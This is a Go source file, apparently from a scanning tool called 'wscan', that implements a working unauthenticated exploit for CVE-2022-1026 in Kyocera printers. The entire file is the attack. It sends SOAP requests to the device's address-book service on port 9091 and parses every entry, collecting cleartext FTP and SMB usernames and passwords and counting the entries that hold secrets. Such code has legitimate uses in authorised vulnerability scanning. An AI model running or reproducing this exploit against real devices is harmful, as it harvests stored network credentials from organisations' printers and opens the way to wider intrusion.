package engine

import (
	"context"
	"crypto/tls"
	"encoding/xml"
	"fmt"
	"io"
	"net"
	"net/http"
	"regexp"
	"strconv"
	"strings"
	"time"
	"wscan/internal/domain"
)

// KyoceraOptions configures the unauthenticated address-book disclosure check
// for Kyocera MFPs (CVE-2022-1026). The SOAP service on TCP/9091 hands out the
// full personal address book, including cleartext SMB/FTP scan credentials.
type KyoceraOptions struct {
	Number   int  // page size requested from the device (reference PoC uses 25)
	WaitSecs int  // seconds to wait for the device to build the enumeration snapshot
	Insecure bool // skip TLS verification; printers ship self-signed certs
}

// KyoceraContact is one parsed address-book entry.
type KyoceraContact struct {
	ID          string `json:"id,omitempty"`
	Name        string `json:"name,omitempty"`
	Furigana    string `json:"furigana,omitempty"`
	Email       string `json:"email,omitempty"`
	FTPServer   string `json:"ftp_server,omitempty"`
	FTPPort     string `json:"ftp_port,omitempty"`
	FTPLogin    string `json:"ftp_login,omitempty"`
	FTPPassword string `json:"ftp_password,omitempty"`
	SMBServer   string `json:"smb_server,omitempty"`
	SMBPort     string `json:"smb_port,omitempty"`
	SMBLogin    string `json:"smb_login,omitempty"`
	SMBPassword string `json:"smb_password,omitempty"`
}

// HasSecret reports whether the contact carries a cleartext FTP/SMB password.
func (c KyoceraContact) HasSecret() bool {
	return c.FTPPassword != "" || c.SMBPassword != ""
}

// KyoceraResult holds the outcome of a disclosure attempt.
type KyoceraResult struct {
	Endpoint    string           `json:"endpoint"`
	Enumeration string           `json:"enumeration"`
	Contacts    []KyoceraContact `json:"contacts"`
	WithSecrets int              `json:"with_secrets"`
	Requests    int              `json:"requests"`
}

const kyoceraURI = "/ws/km-wsdl/setting/address_book"
const kyoceraNS = "http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"

var kyoceraEnumRE = regexp.MustCompile(`<[^>]*enumeration>([^<]+)</[^>]*enumeration>`)

// FetchKyoceraAddressBook performs the two-step SOAP flow against one target:
// create_personal_address_enumeration to obtain a snapshot token, then
// get_personal_address_list to retrieve the entries. No authentication is sent.
func FetchKyoceraAddressBook(ctx context.Context, target domain.Service, o KyoceraOptions) (*KyoceraResult, error) {
	if target.Host == "" || target.Port <= 0 {
		return nil, fmt.Errorf("нужен хост и порт сервиса Kyocera")
	}
	if o.Number <= 0 || o.Number > 1000 {
		o.Number = 25
	}
	if o.WaitSecs < 0 || o.WaitSecs > 60 {
		o.WaitSecs = 5
	}
	scheme := "https"
	if target.Tunnel != "ssl" && target.Port != 9091 && !strings.Contains(strings.ToLower(target.Name), "https") {
		scheme = "http"
	}
	endpoint := fmt.Sprintf("%s://%s%s", scheme, net.JoinHostPort(target.Host, strconv.Itoa(target.Port)), kyoceraURI)

	ctx, cancel := context.WithTimeout(ctx, 90*time.Second)
	defer cancel()

	tr := &http.Transport{
		TLSClientConfig:   &tls.Config{ServerName: strings.Trim(target.Host, "[]"), InsecureSkipVerify: o.Insecure, MinVersion: tls.VersionTLS10},
		DisableKeepAlives: true,
		DialContext: func(ctx context.Context, network, address string) (net.Conn, error) {
			return (&net.Dialer{Timeout: 10 * time.Second}).DialContext(ctx, "tcp", net.JoinHostPort(target.Host, strconv.Itoa(target.Port)))
		},
	}
	defer tr.CloseIdleConnections()
	client := &http.Client{Transport: tr, Timeout: 15 * time.Second, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}

	result := &KyoceraResult{Endpoint: endpoint}

	post := func(action, payload string) ([]byte, error) {
		req, err := http.NewRequestWithContext(ctx, http.MethodPost, endpoint, strings.NewReader(kyoceraSOAP(action, payload)))
		if err != nil {
			return nil, err
		}
		req.Header.Set("Content-Type", "application/soap+xml")
		req.Header.Set("User-Agent", "wscan-kyocera-addressbook")
		result.Requests++
		resp, err := client.Do(req)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()
		data, err := io.ReadAll(io.LimitReader(resp.Body, 4<<20))
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != http.StatusOK {
			return nil, fmt.Errorf("HTTP %d от сервиса адресной книги", resp.StatusCode)
		}
		return data, nil
	}

	enumBody, err := post(kyoceraNS+"/create_personal_address_enumeration",
		fmt.Sprintf("<ns1:create_personal_address_enumerationRequest><ns1:number>%d</ns1:number></ns1:create_personal_address_enumerationRequest>", o.Number))
	if err != nil {
		return result, fmt.Errorf("создание объекта перечисления: %w", err)
	}
	enumeration := parseKyoceraEnumeration(enumBody)
	if enumeration == "" {
		return result, fmt.Errorf("токен enumeration не найден в ответе (сервис может быть пропатчен)")
	}
	result.Enumeration = enumeration

	if o.WaitSecs > 0 {
		select {
		case <-ctx.Done():
			return result, ctx.Err()
		case <-time.After(time.Duration(o.WaitSecs) * time.Second):
		}
	}

	listBody, err := post(kyoceraNS+"/get_personal_address_list",
		fmt.Sprintf("<ns1:get_personal_address_listRequest><ns1:enumeration>%s</ns1:enumeration></ns1:get_personal_address_listRequest>", xmlEscape(enumeration)))
	if err != nil {
		return result, fmt.Errorf("получение списка адресов: %w", err)
	}

	contacts, err := parseKyoceraAddresses(listBody)
	if err != nil {
		return result, err
	}
	result.Contacts = contacts
	for _, c := range contacts {
		if c.HasSecret() {
			result.WithSecrets++
		}
	}
	return result, nil
}

func kyoceraSOAP(action, payload string) string {
	return "<?xml version=\"1.0\" encoding=\"utf-8\"?>" +
		"<SOAP-ENV:Envelope xmlns:SOAP-ENV=\"http://www.w3.org/2003/05/soap-envelope\" " +
		"xmlns:SOAP-ENC=\"http://www.w3.org/2003/05/soap-encoding\" " +
		"xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" " +
		"xmlns:wsa=\"http://schemas.xmlsoap.org/ws/2004/08/addressing\" xmlns:xop=\"http://www.w3.org/2004/08/xop/include\" " +
		"xmlns:ns1=\"" + kyoceraNS + "\">" +
		"<SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand=\"true\">" + action + "</wsa:Action></SOAP-ENV:Header>" +
		"<SOAP-ENV:Body>" + payload + "</SOAP-ENV:Body>" +
		"</SOAP-ENV:Envelope>"
}

func xmlEscape(s string) string {
	var b strings.Builder
	_ = xml.EscapeText(&b, []byte(s))
	return b.String()
}

// parseKyoceraEnumeration extracts the snapshot token. A regex is used (as in
// the reference PoC) because namespace prefixes vary between firmware builds.
func parseKyoceraEnumeration(body []byte) string {
	m := kyoceraEnumRE.FindSubmatch(body)
	if len(m) < 2 {
		return ""
	}
	return strings.TrimSpace(string(m[1]))
}

// Go's xml decoder matches start elements by local name when the struct tag
// carries no namespace, so the kmaddrbook: prefixes are handled transparently.
type kyoceraListEnvelope struct {
	XMLName   xml.Name
	Addresses []kyoceraXMLAddress `xml:"Body>get_personal_address_listResponse>personal_address"`
}

type kyoceraXMLAddress struct {
	ID       string `xml:"name_information>id"`
	Name     string `xml:"name_information>name"`
	Furigana string `xml:"name_information>furigana"`
	Email    string `xml:"email_information>address"`

	FTPServer    string `xml:"ftp_information>server_name"`
	FTPPort      string `xml:"ftp_information>port_number"`
	FTPLoginName string `xml:"ftp_information>login_name"`
	FTPUserName  string `xml:"ftp_information>user_name"`
	FTPPassword  string `xml:"ftp_information>login_password"`

	SMBServer    string `xml:"smb_information>server_name"`
	SMBPort      string `xml:"smb_information>port_number"`
	SMBLoginName string `xml:"smb_information>login_name"`
	SMBUserName  string `xml:"smb_information>user_name"`
	SMBPassword  string `xml:"smb_information>login_password"`
}

func parseKyoceraAddresses(body []byte) ([]KyoceraContact, error) {
	var env kyoceraListEnvelope
	if err := xml.Unmarshal(body, &env); err != nil {
		return nil, fmt.Errorf("разбор XML адресной книги: %w", err)
	}
	contacts := make([]KyoceraContact, 0, len(env.Addresses))
	for _, a := range env.Addresses {
		c := KyoceraContact{
			ID:          strings.TrimSpace(a.ID),
			Name:        strings.TrimSpace(a.Name),
			Furigana:    strings.TrimSpace(a.Furigana),
			Email:       strings.TrimSpace(a.Email),
			FTPServer:   strings.TrimSpace(a.FTPServer),
			FTPPort:     strings.TrimSpace(a.FTPPort),
			FTPLogin:    strings.TrimSpace(firstNonEmpty(a.FTPLoginName, a.FTPUserName)),
			FTPPassword: strings.TrimSpace(a.FTPPassword),
			SMBServer:   strings.TrimSpace(a.SMBServer),
			SMBPort:     strings.TrimSpace(a.SMBPort),
			SMBLogin:    strings.TrimSpace(firstNonEmpty(a.SMBLoginName, a.SMBUserName)),
			SMBPassword: strings.TrimSpace(a.SMBPassword),
		}
		contacts = append(contacts, c)
	}
	return contacts, nil
}

func firstNonEmpty(values ...string) string {
	for _, v := range values {
		if v != "" {
			return v
		}
	}
	return ""
}
